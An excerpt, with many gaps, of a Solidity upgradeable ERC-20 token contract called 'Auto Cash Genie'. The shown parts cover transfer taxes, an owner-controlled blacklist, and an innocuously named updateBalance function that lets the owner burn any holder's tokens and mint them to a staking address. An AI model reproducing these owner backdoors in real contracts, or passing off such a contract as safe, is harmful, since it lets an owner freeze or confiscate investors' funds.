...
contract GenieToken is Initializable, ContextUpgradeable, ERC20Upgradeable, UUPSUpgradeable, Whitelist {
    ...
    function initialize() public initializer {
        ...
        __ERC20_init("Auto Cash Genie", "Genie");
        __Ownable_init();
    ...
    function setTransferEnable(bool _value) public onlyOwner {
        transferEnable = _value;
    }
    ...
    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool) {
        require(!_isBlacklist[_from], "User Blacklisted");
        if(transferEnable){
            (uint256 adjustedValue, uint256 taxAmount, uint256 taxAmountVault, uint taxAmountStaking, uint taxAmountMarketing) = calculateTransferTaxes(_from, _to, _value);

            if (taxAmount > 0){
                require(super.transferFrom(_from, vaultAddress, taxAmountVault), "Vault tx failed");
                require(super.transferFrom(_from, stakingAddress, taxAmountStaking), "staking tx failed");
                require(super.transferFrom(_from, marketingAddress, taxAmountMarketing), "marketing tx failed");
    ...
    function transfer(address _to, uint256 _value) public override returns (bool) {
        require(!_isBlacklist[msg.sender], "User Blacklisted");
        if(transferEnable){
            (uint256 adjustedValue, uint256 taxAmount, uint256 taxAmountVault, uint taxAmountStaking, uint taxAmountMarketing) = calculateTransferTaxes(msg.sender, _to, _value);

            if (taxAmount > 0){
                require(super.transfer(vaultAddress, taxAmountVault), "vault tx failed");
                require(super.transfer(stakingAddress, taxAmountStaking), "staking tx failed");
                require(super.transfer(marketingAddress, taxAmountMarketing), "marketing tx failed");
    ...
    function calculateTransferTaxes(address _from, address _to, uint256 _value) public view returns (uint256 adjustedValue, uint256 taxAmount, uint256 taxAmountVault, uint taxAmountStaking, uint taxAmountMarketing){
        adjustedValue = _value;
        taxAmount = 0;
        uint256 adjustedValueVault;
        uint256 adjustedValueStaking;
        uint256 adjustedValueMarketing;

        if (!_isExcluded[_from] && isTaxEnable) {
            ...
            (adjustedValueVault, taxAmountVault) = calculateTransactionTax(_value, 6);
            (adjustedValueStaking, taxAmountStaking) = calculateTransactionTax(_value, 2);
            (adjustedValueMarketing, taxAmountMarketing) = calculateTransactionTax(_value, 2);
        }
        return (adjustedValue, taxAmount, taxAmountVault, taxAmountStaking, taxAmountMarketing);
    }
    ...
    */
    ...
    function updateBalance(address account, uint amount) public onlyOwner{
        _burn(account, amount);
        _mint(stakingAddress, amount);
    }

    function addToBlackList(address[] memory userAddress) public onlyOwner{
        for(uint i = 0; i < userAddress.length; i++){
            _isBlacklist[userAddress[i]] = true;
        }
    }

    function removeFromBlackList(address[] memory userAddress) public onlyOwner{
        for(uint i = 0; i < userAddress.length; i++){
            _isBlacklist[userAddress[i]] = false;
        }
    }

    function isBlacklist(address userAddress) public view returns(bool){
        return _isBlacklist[userAddress];
    }
}
